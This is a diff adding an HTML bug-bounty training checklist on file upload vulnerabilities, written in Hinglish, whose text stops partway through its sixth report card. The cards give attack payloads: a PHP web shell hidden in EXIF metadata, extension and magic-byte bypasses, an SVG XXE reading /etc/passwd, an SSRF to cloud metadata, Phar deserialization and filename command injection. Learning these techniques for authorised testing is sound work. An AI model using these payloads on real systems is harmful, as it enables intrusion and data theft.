@@ -1,0 +1,2975 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mission 13 - File Upload Vulnerability Master Checklist</title>
+    <meta name="description" content="40 HackerOne + Bugcrowd File Upload reports across 7 phases.">
+    <link
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;700&display=swap"
+        rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box
+        }
+
+        :root {
+            --bg: #0a0a0f;
+            --surface: #12121a;
+            --surface2: #1a1a26;
+            --border: #2a2a3a;
+            --text: #e0e0f0;
+            --text2: #8888aa;
+            --accent: #e74c3c;
+            --accent2: #ff6b6b;
+            --glow: rgba(231, 76, 60, .15);
+            --critical: #ef4444;
+            --high: #f97316;
+            --medium: #eab308;
+            --green: #22c55e
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Inter', sans-serif;
+            line-height: 1.6;
+            min-height: 100vh
+        }
+
+        code.c {
+            background: #1e1e2e;
+            padding: 2px 7px;
+            border-radius: 4px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .82em;
+            color: var(--accent2);
+            border: 1px solid #2a2a3a
+        }
+
+        .mission-header {
+            background: linear-gradient(135deg, #0f0f18 0%, #1a0f0f 50%, #0f0f18 100%);
+            border-bottom: 2px solid var(--accent);
+            padding: 40px 24px 32px;
+            text-align: center;
+            position: relative;
+            overflow: hidden
+        }
+
+        .mission-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(ellipse at 50% 0%, rgba(231, 76, 60, .08) 0%, transparent 70%);
+            pointer-events: none
+        }
+
+        .mission-badge {
+            display: inline-block;
+            background: linear-gradient(135deg, var(--accent), #c0392b);
+            color: #fff;
+            font-weight: 800;
+            padding: 6px 20px;
+            border-radius: 20px;
+            font-size: .75rem;
+            letter-spacing: 2px;
+            margin-bottom: 12px
+        }
+
+        .mission-title {
+            font-size: clamp(1.6rem, 4vw, 2.4rem);
+            font-weight: 900;
+            background: linear-gradient(135deg, var(--accent), #fca5a5, var(--accent2));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-bottom: 8px
+        }
+
+        .mission-subtitle {
+            color: var(--text2);
+            font-size: .95rem;
+            max-width: 750px;
+            margin: 0 auto 20px
+        }
+
+        .stats-row {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            flex-wrap: wrap;
+            margin-top: 16px
+        }
+
+        .stat-box {
+            text-align: center
+        }
+
+        .stat-value {
+            font-size: 1.8rem;
+            font-weight: 900;
+            color: var(--accent)
+        }
+
+        .stat-label {
+            font-size: .7rem;
+            color: var(--text2);
+            letter-spacing: 1.5px;
+            text-transform: uppercase
+        }
+
+        .master-progress {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            margin: 20px auto;
+            max-width: 900px;
+            border-radius: 12px;
+            padding: 16px 24px
+        }
+
+        .master-progress-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px
+        }
+
+        .master-progress-label {
+            font-size: .8rem;
+            font-weight: 700;
+            color: var(--text2);
+            letter-spacing: 1px;
+            text-transform: uppercase
+        }
+
+        .master-bar-wrap {
+            height: 10px;
+            background: #1a1a2e;
+            border-radius: 8px;
+            overflow: hidden
+        }
+
+        .master-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), var(--accent2));
+            border-radius: 8px;
+            transition: width .5s ease
+        }
+
+        .filter-bar {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            padding: 16px;
+            flex-wrap: wrap;
+            max-width: 900px;
+            margin: 0 auto
+        }
+
+        .filter-btn {
+            background: var(--surface2);
+            color: var(--text2);
+            border: 1px solid var(--border);
+            padding: 7px 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: .78rem;
+            font-weight: 600;
+            transition: all .2s
+        }
+
+        .filter-btn:hover,
+        .filter-btn.active {
+            background: var(--accent);
+            color: #fff;
+            border-color: var(--accent)
+        }
+
+        .phase-section {
+            max-width: 960px;
+            margin: 28px auto;
+            padding: 0 16px
+        }
+
+        .phase-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+            flex-wrap: wrap
+        }
+
+        .phase-number {
+            background: linear-gradient(135deg, var(--accent), #c0392b);
+            color: #fff;
+            font-weight: 900;
+            padding: 4px 14px;
+            border-radius: 6px;
+            font-size: .75rem;
+            letter-spacing: 1.5px
+        }
+
+        .phase-title {
+            font-weight: 700;
+            font-size: .95rem;
+            color: var(--text);
+            flex: 1
+        }
+
+        .phase-count {
+            font-size: .75rem;
+            color: var(--accent);
+            font-weight: 700
+        }
+
+        .cards-grid {
+            display: flex;
+            flex-direction: column;
+            gap: 16px
+        }
+
+        .report-card {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all .3s
+        }
+
+        .report-card:hover {
+            border-color: var(--accent);
+            box-shadow: 0 0 20px var(--glow)
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding: 16px 20px;
+            background: var(--surface2);
+            gap: 12px
+        }
+
+        .report-number {
+            font-size: .72rem;
+            font-weight: 700;
+            color: var(--accent);
+            letter-spacing: 1px
+        }
+
+        .report-title {
+            font-size: 1rem;
+            font-weight: 800;
+            color: var(--text);
+            margin: 4px 0
+        }
+
+        .report-target {
+            font-size: .78rem;
+            color: var(--text2)
+        }
+
+        .severity-badge {
+            padding: 4px 12px;
+            border-radius: 6px;
+            font-size: .7rem;
+            font-weight: 800;
+            letter-spacing: 1px;
+            white-space: nowrap;
+            height: fit-content
+        }
+
+        .sev-critical {
+            background: rgba(239, 68, 68, .15);
+            color: var(--critical);
+            border: 1px solid rgba(239, 68, 68, .3)
+        }
+
+        .sev-high {
+            background: rgba(249, 115, 22, .15);
+            color: var(--high);
+            border: 1px solid rgba(249, 115, 22, .3)
+        }
+
+        .sev-medium {
+            background: rgba(234, 179, 8, .15);
+            color: var(--medium);
+            border: 1px solid rgba(234, 179, 8, .3)
+        }
+
+        .technique-tag {
+            display: inline-block;
+            background: rgba(231, 76, 60, .08);
+            color: var(--accent2);
+            border: 1px solid rgba(231, 76, 60, .2);
+            padding: 2px 10px;
+            border-radius: 4px;
+            font-size: .7rem;
+            font-weight: 600;
+            margin: 2px 4px 2px 0
+        }
+
+        .card-body {
+            padding: 16px 20px
+        }
+
+        .scenario-box {
+            background: linear-gradient(135deg, rgba(231, 76, 60, .05), rgba(231, 76, 60, .02));
+            border: 1px solid rgba(231, 76, 60, .15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-bottom: 16px
+        }
+
+        .scenario-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: var(--accent);
+            letter-spacing: 1.5px;
+            margin-bottom: 6px
+        }
+
+        .scenario-text {
+            font-size: .85rem;
+            color: var(--text2);
+            line-height: 1.7
+        }
+
+        .mindset-box {
+            background: linear-gradient(135deg, rgba(34, 197, 94, .05), rgba(34, 197, 94, .02));
+            border: 1px solid rgba(34, 197, 94, .15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .mindset-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: var(--green);
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .mindset-text {
+            font-size: .83rem;
+            color: var(--text2);
+            line-height: 1.6;
+            font-style: italic
+        }
+
+        .protip-box {
+            background: linear-gradient(135deg, rgba(99, 102, 241, .06), rgba(99, 102, 241, .02));
+            border: 1px solid rgba(99, 102, 241, .2);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .protip-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: #818cf8;
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .protip-text {
+            font-size: .83rem;
+            color: var(--text2);
+            line-height: 1.6
+        }
+
+        .impact-box {
+            background: linear-gradient(135deg, rgba(239, 68, 68, .06), rgba(239, 68, 68, .02));
+            border: 1px solid rgba(239, 68, 68, .15);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .impact-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: var(--critical);
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .impact-text {
+            font-size: .83rem;
+            color: var(--text2);
+            line-height: 1.6
+        }
+
+        .chain-box {
+            background: linear-gradient(135deg, rgba(168, 85, 247, .06), rgba(168, 85, 247, .02));
+            border: 1px solid rgba(168, 85, 247, .2);
+            border-radius: 8px;
+            padding: 14px;
+            margin-top: 12px
+        }
+
+        .chain-label {
+            font-size: .7rem;
+            font-weight: 800;
+            color: #a855f7;
+            letter-spacing: 1.5px;
+            margin-bottom: 4px
+        }
+
+        .chain-formula {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .8rem;
+            color: #c084fc;
+            word-break: break-all
+        }
+
+        .checklist-label {
+            font-size: .72rem;
+            font-weight: 800;
+            color: var(--accent);
+            letter-spacing: 1.5px;
+            margin-bottom: 8px
+        }
+
+        .checklist {
+            list-style: none;
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin-bottom: 14px
+        }
+
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+            padding: 8px 10px;
+            background: var(--surface2);
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all .2s;
+            user-select: none
+        }
+
+        .checklist-item:hover {
+            border-color: rgba(231, 76, 60, .3)
+        }
+
+        .checklist-item.done {
+            border-color: rgba(34, 197, 94, .3);
+            background: rgba(34, 197, 94, .04)
+        }
+
+        .checklist-item.done .item-checkbox {
+            background: var(--green);
+            border-color: var(--green)
+        }
+
+        .checklist-item.done .item-checkbox::after {
+            content: '\2713';
+            color: #fff;
+            font-size: .65rem;
+            font-weight: 900
+        }
+
+        .item-checkbox {
+            min-width: 18px;
+            height: 18px;
+            border: 2px solid #444;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 1px;
+            transition: all .2s
+        }
+
+        .item-step {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: .7rem;
+            font-weight: 700;
+            color: var(--accent);
+            min-width: 20px
+        }
+
+        .item-text {
+            font-size: .82rem;
+            color: var(--text2);
+            line-height: 1.5
+        }
+
+        .item-text strong {
+            color: var(--text);
+            font-weight: 700
+        }
+
+        .card-progress {
+            margin-top: 14px;
+            padding-top: 12px;
+            border-top: 1px solid var(--border)
+        }
+
+        .card-progress-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 6px
+        }
+
+        .card-progress-label {
+            font-size: .68rem;
+            font-weight: 700;
+            color: var(--text2);
+            letter-spacing: 1px;
+            text-transform: uppercase
+        }
+
+        .card-progress-pct {
+            font-size: .72rem;
+            font-weight: 800;
+            color: var(--accent)
+        }
+
+        .card-bar-wrap {
+            height: 5px;
+            background: #1a1a2e;
+            border-radius: 4px;
+            overflow: hidden
+        }
+
+        .card-bar-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, var(--accent), var(--green));
+            border-radius: 4px;
+            transition: width .4s
+        }
+
+        .mission-footer {
+            text-align: center;
+            padding: 40px 20px;
+            border-top: 1px solid var(--border);
+            margin-top: 40px
+        }
+
+        .footer-text {
+            font-size: .75rem;
+            color: var(--text2);
+            letter-spacing: 2px
+        }
+    </style>
+</head>
+
+<body>
+    <header class="mission-header">
+        <div class="mission-badge">MISSION 13 - FILE UPLOAD MASTERY</div>
+        <h1 class="mission-title">FILE UPLOAD VULNERABILITY MASTER CHECKLIST</h1>
+        <p class="mission-subtitle">40 Reports - Magic Bytes - Extension Bypass - SVG XXE - Phar - ImageTragick - Race
+            Condition - SSRF - Polyglot - Zip Slip - Ghostscript - Total Bounty: $200,000+</p>
+        <div class="stats-row">
+            <div class="stat-box">
+                <div class="stat-value">40</div>
+                <div class="stat-label">REPORTS</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value">7</div>
+                <div class="stat-label">PHASES</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="completedItems">0</div>
+                <div class="stat-label">STEPS DONE</div>
+            </div>
+            <div class="stat-box">
+                <div class="stat-value" id="completedCards">0</div>
+                <div class="stat-label">CARDS DONE</div>
+            </div>
+        </div>
+    </header>
+    <div class="master-progress">
+        <div class="master-progress-header"><span class="master-progress-label">OVERALL MASTERY</span><span
+                class="master-progress-label" id="masterPct">0%</span></div>
+        <div class="master-bar-wrap">
+            <div class="master-bar-fill" id="masterBar"></div>
+        </div>
+    </div>
+    <div class="filter-bar">
+        <button class="filter-btn active" onclick="filterCards('all',this)">All Reports</button>
+        <button class="filter-btn" onclick="filterCards('critical',this)">Critical</button>
+        <button class="filter-btn" onclick="filterCards('high',this)">High</button>
+        <button class="filter-btn" onclick="filterCards('medium',this)">Medium</button>
+        <button class="filter-btn" onclick="filterCards('complete',this)">Complete</button>
+        <button class="filter-btn" onclick="filterCards('incomplete',this)">Incomplete</button>
+    </div>
+
+    <!-- PHASE 1 - CORE BYPASS TECHNIQUES -->
+    <section class="phase-section" id="phase1">
+        <div class="phase-header"><span class="phase-number">PHASE 01</span><span class="phase-title">CORE BYPASS
+                TECHNIQUES - Magic Bytes / Double Extension / EXIF / SVG XXE / Phar</span><span class="phase-count"
+                id="p1count">0 / 5 reports</span></div>
+        <div class="cards-grid" id="grid-phase1">
+
+            <div class="report-card" data-severity="critical" id="report-01">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">REPORT #01</div>
+                        <div class="report-title">Magic Bytes & MIME-Type Spoofing - Profile Picture RCE</div>
+                        <div class="report-target">Target: Big Tech E-commerce - $2,500 - Critical</div>
+                        <div style="margin-top:8px"><span class="technique-tag">FF D8 FF E0</span><span
+                                class="technique-tag">GIF89a</span><span class="technique-tag">Content-Type Spoof</span>
+                        </div>
+                    </div><span class="severity-badge sev-critical">CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">SCENARIO</div>
+                        <div class="scenario-text"><code class="c">shell.php</code> upload - "Invalid File Content".
+                            Server file ke "DNA" (Magic Bytes) check karta. Fix: PHP file ke start mein JPEG magic bytes
+                            <code class="c">FF D8 FF E0</code> dalo + Content-Type: <code class="c">image/jpeg</code>
+                            spoof. Server socha "Image hai" - upload accept - <code
+                                class="c">/uploads/shell.php?cmd=id</code> - <code class="c">uid=0(root)</code>. Full
+                            RCE!</div>
+                    </div>
+                    <div class="checklist-label">EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Burp se request intercept karo</strong> - Upload request pakdo
+                                aur modify karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>MIME-Type change karo</strong> - <code
+                                    class="c">Content-Type: application/x-php</code> to <code
+                                    class="c">image/jpeg</code></span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Magic Bytes inject karo</strong> - File start mein <code
+                                    class="c">GIF89a;</code> (GIF) ya JPEG hex values dalo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Polyglot file banao</strong> - ExifTool se Image + Code ek
+                                file mein.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Re-encoding check karo</strong> - Upload ke baad server ne
+                                file process karke code uda toh nahi diya?</span>
+                        </li>
+                    </ul>
+                    <div class="mindset-box">
+                        <div class="mindset-label">MASTER TIP</div>
+                        <div class="mindset-text">"Aaj kal ke WAFs file content ko Re-encode kar dete hain jisse code
+                            delete ho jata hai. Isse bachne ke liye Metadata Injection aur Phar Deserialization seekho."
+                        </div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="report-card" data-severity="critical" id="report-02">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">REPORT #02</div>
+                        <div class="report-title">Double Extension & Path Injection - Avatar Upload RCE</div>
+                        <div class="report-target">Target: Global Healthcare - $3,800 - Critical</div>
+                        <div style="margin-top:8px"><span class="technique-tag">shell.php.jpg</span><span
+                                class="technique-tag">Apache R-to-L</span><span
+                                class="technique-tag">cgi.fix_pathinfo</span></div>
+                    </div><span class="severity-badge sev-critical">CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">SCENARIO</div>
+                        <div class="scenario-text"><code class="c">shell.php</code> Blocked. <code
+                                class="c">shell.php.jpg</code> upload. Apache Right-to-Left read - .jpg unknown - .php
+                            execute! Nginx trick: <code class="c">/uploads/cat.jpg/.php</code> bhi kaam karta hai
+                            (FastCGI Bypass)!</div>
+                    </div>
+                    <div class="checklist-label">EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Double Extension try karo</strong> - <code
+                                    class="c">shell.php.jpg</code>, <code class="c">shell.php.png</code>, <code
+                                    class="c">shell.php.gif</code>.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Null Byte (Legacy)</strong> - <code
+                                    class="c">shell.php%00.jpg</code> (PHP &lt; 5.3).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Alternative extensions</strong> - <code
+                                    class="c">.php5</code>, <code class="c">.phtml</code>, <code class="c">.phar</code>,
+                                <code class="c">.PhP</code> case mixing.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Trailing dots/spaces</strong> - <code
+                                    class="c">shell.php.</code> (Windows), <code class="c">shell.php </code>
+                                (misconfigured).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Nginx FastCGI test</strong> - <code
+                                    class="c">/uploads/image.jpg/.php</code> if <code
+                                    class="c">cgi.fix_pathinfo=1</code>.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="report-card" data-severity="critical" id="report-03">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">REPORT #03</div>
+                        <div class="report-title">EXIF Metadata Injection - Photo Hosting RCE</div>
+                        <div class="report-target">Target: Photo Editing SaaS - $5,500 - Critical</div>
+                        <div style="margin-top:8px"><span class="technique-tag">ExifTool</span><span
+                                class="technique-tag">Comment Field</span><span class="technique-tag">ImageTragick
+                                Chain</span></div>
+                    </div><span class="severity-badge sev-critical">CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">SCENARIO</div>
+                        <div class="scenario-text">Server strict - non-image delete. Fix: Asali image lo, <code
+                                class="c">exiftool -Comment='&lt;?php system($_GET["cmd"]); ?&gt;' photo.jpg</code>.
+                            File 100% valid JPEG dikhti hai. Nginx trick (<code class="c">/photo.jpg/.php</code>) se
+                            execution force karo - Full RCE!</div>
+                    </div>
+                    <div class="checklist-label">EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>Real image lo</strong> - High-quality .jpg/.png base file
+                                zaroori hai.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Metadata inject karo</strong> - <code
+                                    class="c">Comment</code>, <code class="c">Artist</code>, <code
+                                    class="c">DocumentName</code> fields target karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>XSS check karo</strong> - Metadata mein <code
+                                    class="c">&lt;script&gt;alert(1)&lt;/script&gt;</code> (Second-Order XSS).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>ImageMagick test karo</strong> - Purane versions mein metadata
+                                se seedha RCE.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>Preservation verify karo</strong> - Upload ke baad download
+                                karo, metadata strip toh nahi hua?</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="report-card" data-severity="critical" id="report-04">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">REPORT #04</div>
+                        <div class="report-title">SVG XML External Entity (XXE) - Logo Upload LFI</div>
+                        <div class="report-target">Target: Financial Dashboard - $6,500 - Critical</div>
+                        <div style="margin-top:8px"><span class="technique-tag">ENTITY</span><span
+                                class="technique-tag">file:///etc/passwd</span><span class="technique-tag">OOB
+                                XXE</span></div>
+                    </div><span class="severity-badge sev-critical">CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">SCENARIO</div>
+                        <div class="scenario-text">Custom Logo upload - .svg support. Payload SVG: <code
+                                class="c">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;</code>
+                            + <code class="c">&lt;text&gt;&amp;xxe;&lt;/text&gt;</code>. Server render karta hai - logo
+                            ki jagah <code class="c">root:x:0:0</code> list dikh gayi!</div>
+                    </div>
+                    <div class="checklist-label">EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>SVG upload dhoondho</strong> - Profile icons, Logos, Chart
+                                exports mein .svg try karo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Local file read karo</strong> - <code
+                                    class="c">file:///etc/passwd</code> (Linux), <code
+                                    class="c">file:///C:/Windows/win.ini</code> (Windows).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>Blind XXE test karo</strong> - Output nahi? OOB via Burp
+                                Collaborator se data bahar bhejo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>SSRF check karo</strong> - Entity mein <code
+                                    class="c">http://169.254.169.254/latest/meta-data/</code> (AWS).</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>XSS fallback</strong> - XXE nahi mila? SVG mein <code
+                                    class="c">&lt;script&gt;</code> tag se XSS try karo.</span>
+                        </li>
+                    </ul>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="report-card" data-severity="critical" id="report-05">
+                <div class="card-header">
+                    <div class="card-meta">
+                        <div class="report-number">REPORT #05</div>
+                        <div class="report-title">Phar Deserialization - Cloud Storage Full RCE</div>
+                        <div class="report-target">Target: Cloud Storage & Backup - $9,500 - Critical</div>
+                        <div style="margin-top:8px"><span class="technique-tag">phar://</span><span
+                                class="technique-tag">POP Chain</span><span class="technique-tag">JPEG Stub</span></div>
+                    </div><span class="severity-badge sev-critical">CRITICAL</span>
+                </div>
+                <div class="card-body">
+                    <div class="scenario-box">
+                        <div class="scenario-label">SCENARIO</div>
+                        <div class="scenario-text">Server extension restrict + re-encode. Fix: Phar archive jiski stub
+                            JPEG dikhti hai. Metadata mein POP Chain inject. Upload as <code class="c">image.jpg</code>.
+                            Trigger: <code class="c">phar://uploads/image.jpg</code>. Backend <code
+                                class="c">file_exists()</code> call - PHP unserialize - command execute - Full RCE!
+                        </div>
+                    </div>
+                    <div class="checklist-label">EXECUTION CHECKLIST</div>
+                    <ul class="checklist">
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">01</span><span
+                                class="item-text"><strong>File wrappers dhoondho</strong> - <code
+                                    class="c">phar://</code>, <code class="c">zip://</code>, <code
+                                    class="c">gopher://</code> accept ho raha hai?</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">02</span><span
+                                class="item-text"><strong>Phar polyglot banao</strong> - Stub mein <code
+                                    class="c">GIF89a</code> ya JPEG bytes dalo taaki server image maane.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">03</span><span
+                                class="item-text"><strong>POP Chains identify karo</strong> - Guzzle, Monolog, Laravel
+                                libraries exploit karne ke liye.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">04</span><span
+                                class="item-text"><strong>Trigger call dhoondho</strong> - File path use hone wali
+                                feature mein <code class="c">phar://</code> prefix dalo.</span>
+                        </li>
+                        <li class="checklist-item" onclick="toggleItem(this)">
+                            <div class="item-checkbox"></div><span class="item-step">05</span><span
+                                class="item-text"><strong>PHP version check karo</strong> - PHP 7.x mein sabse best,
+                                8.0+ mein partial patches.</span>
+                        </li>
+                    </ul>
+                    <div class="chain-box">
+                        <div class="chain-label">ATTACK CHAIN</div>
+                        <div class="chain-formula">JPEG Stub + Phar Metadata (POP Chain) - Upload as image.jpg - Trigger
+                            phar:// wrapper - PHP unserialize() - Gadget Chain Execute - RCE!</div>
+                    </div>
+                    <div class="card-progress">
+                        <div class="card-progress-header"><span class="card-progress-label">STEPS COMPLETED</span><span
+                                class="card-progress-pct">0%</span></div>
+                        <div class="card-bar-wrap">
+                            <div class="card-bar-fill"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section><!-- PHASE 2 - OS & SERVER ATTACKS -->
+<section class="phase-section" id="phase2">
+    <div class="phase-header"><span class="phase-number">PHASE 02</span><span class="phase-title">OS & SERVER ATTACKS -
+            Filename Injection / S3 Bucket / Zip Slip / ImageTragick / Race Condition</span><span class="phase-count"
+            id="p2count">0 / 5 reports</span></div>
+    <div class="cards-grid" id="grid-phase2">
+
+        <div class="report-card" data-severity="critical" id="report-06">
+            <div class="card-header">
+                <div class="card-meta">
+                    <div class="report-number">REPORT #06</div>
+                    <div class="report-title">Filename Command Injection - Video Processing RCE</div>
+                    <div class="report-target">Target: Video Processing Platform - $4,200 - Critical</div>
+                    <div style="margin-top:8px"><span class="technique-tag">; sleep 10;</span><span
+                            class="technique-tag">`whoami`</span><span class="technique-tag">ImageMagick CLI</span>
+                    </div>
+                </div><span class="severity-badge sev-critical">CRITICAL</span>
+            </div>
+            <div class="card-body">
+                <div class="scenario-box">
+                    <div class="scenario-label">SCENARIO</div>
+                    <div class="scenario-text">Backend: <code
+                            class="c">system("convert " + filename + " -resize 100x100")</code>. Filename: <code
+                            class="c">image.jpg; sleep 10; .jpg</code>. Bash dekha <code class="c">;</code> - pehle
+                        convert, phir <code class="c">sleep 10</code> execute - Response 10.2s delay = RCE!</div>
+                </div>
+                <div class="checklist-label">EXECUTION CHECKLIST</div>
+                <ul class="checklist">
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">01</span><span
+                            class="item-text"><strong>Semicolon test karo</strong> - Filename: <code
+                                class="c">file.jpg;sleep 10;</code></span>
+                    </li>
+                    <li class="checklist-item" onclick="toggleItem(this)">
+                        <div class="item-checkbox"></div><span class="item-step">02</span><span
+                            class="item-text"><strong>Pipe/Backtick test karo</strong> - <code
+                                class="c">file.jpg`whoami`.jpg</code> ya <code class="c">$(id).jpg</code></span>
+                    </li>
